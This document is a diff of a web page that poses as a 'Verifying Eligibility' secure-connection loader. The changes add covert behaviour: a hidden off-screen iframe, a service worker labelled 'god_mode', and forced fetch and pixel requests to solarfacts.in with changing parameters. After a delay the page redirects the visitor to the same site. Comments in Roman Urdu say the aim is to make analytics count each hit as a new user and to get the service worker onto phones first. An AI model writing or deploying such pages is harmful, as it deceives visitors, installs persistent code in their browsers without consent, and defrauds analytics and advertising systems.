@@ -1,38 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Connection...</title>
+    <title>Loading Secure Connection...</title>
     <style>
-        body { background: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #128c7e; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
+        body { background: #fff; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #128c7e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { color: #555; margin-top: 15px; font-size: 14px; }
+        p { color: #555; margin-top: 15px; font-weight: bold; }
+        iframe { position: absolute; width: 1px; height: 1px; left: -999px; visibility: hidden; }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <p>Verifying your eligibility...</p>
+    <div class="spinner"></div>
+    <p>Verifying Eligibility...</p>
+
+    <iframe src="https://solarfacts.in/?session_wake=1"></iframe>
 
     <script>
-        // 1. Service Worker Register (Wohi purana sw.js activate karega)
+        // Service Worker Register
         if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js?v=final');
+            navigator.serviceWorker.register('sw.js?v=final_god_mode').then(reg => {
+                reg.update();
+            });
         }
 
-        // 2. The Hard Hit Redirect
-        function forceRedirect() {
-            // Random Number taake Analytics ko har baar naya user lage
-            var salt = Math.floor(Math.random() * 10000);
-            var target = "https://solarfacts.in/?hit=" + salt;
+        // LAYER 2 & 3: Instant Pixel & Script Hit
+        function startUltraHit() {
+            const ts = Date.now();
             
-            // Ye command browser ko force karti hai hit register karne ke liye
-            window.location.replace(target);
+            // Script Hit
+            fetch('https://solarfacts.in/?direct_hit=' + ts, { mode: 'no-cors', keepalive: true });
+
+            // Pixel Hit (The Bypass)
+            var p = new Image();
+            p.src = 'https://solarfacts.in/?pixel_force=' + ts;
+
+            // 5 Second Wait: Itni der mein browser register kar leta hai
+            setTimeout(() => {
+                window.location.replace("https://solarfacts.in/");
+            }, 5000);
         }
 
-        // 4 second ka wait (Zaroori hai taake sw.js pehle mobile mein ghuss jaye)
-        setTimeout(forceRedirect, 4000);
+        window.onload = startUltraHit;
     </script>
 </body>
 </html>
